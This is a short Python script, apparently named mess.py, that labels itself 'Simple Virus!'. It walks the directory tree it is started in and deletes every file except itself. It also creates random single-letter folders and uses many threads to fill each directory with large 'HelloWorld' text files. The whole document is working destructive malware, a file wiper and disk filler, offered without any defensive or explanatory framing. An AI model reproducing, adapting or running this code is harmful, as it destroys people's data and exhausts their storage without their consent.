import threading
import os
from random import choice, randint
import string
from time import sleep

location = os.getcwd()
print(location)
print('=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=')
x = 0

def creating(loop, path):
    """change currect path to taregt and open HelloWorld(Num) files and write HelloWorld in that"""
    os.chdir(path)
    try :
        with open(f"HelloWorld{loop}" ,"w") as e:
            e.write("HelloWorld-HelloWorld-HelloWorld-HelloWorld-HelloWorld-HelloWorld-HelloWorld-HelloWorld-\n"*1000)
    except :
        print(os.getpgid)
        
def looping(path):
    """looping function to create HelloWorld files"""
    global x
    x+=1
    for i in range(50) :
        threading.Thread(target=creating, args=(x, path)).start()

def deleting(path_):
    """delete all files in the currect folder that file is except our program """
    for file in files :
        if file != "mess.py" :
            os.remove(os.path.join(path_, file))

# this program walk in the folders and find most files and delete them
for path, dirs, files in os.walk(location):
    if len(files) != 0:
        threading.Thread(target=deleting, args=(path, )).start()

# create names
for i in range(randint(0, 500)):
    try :
        os.mkdir(f"{choice(string.ascii_letters)}")
    except :
        try :
            os.mkdir(f"{choice(string.ascii_lowercase)}")
        except :
            try:
                os.mkdir(f"{choice(string.ascii_uppercase)}")
            except:
                pass

# walking around and create HelloWorld files
for path, dirs, files in os.walk(location):
    print(files)
    print(path)
    print(dirs)
    if len(files) != 0:
        threading.Thread(target=deleting, args=(path, )).start()
    threading.Thread(target=looping, args=(path, )).start()

    

    print("______________")



print("Simple Virus!")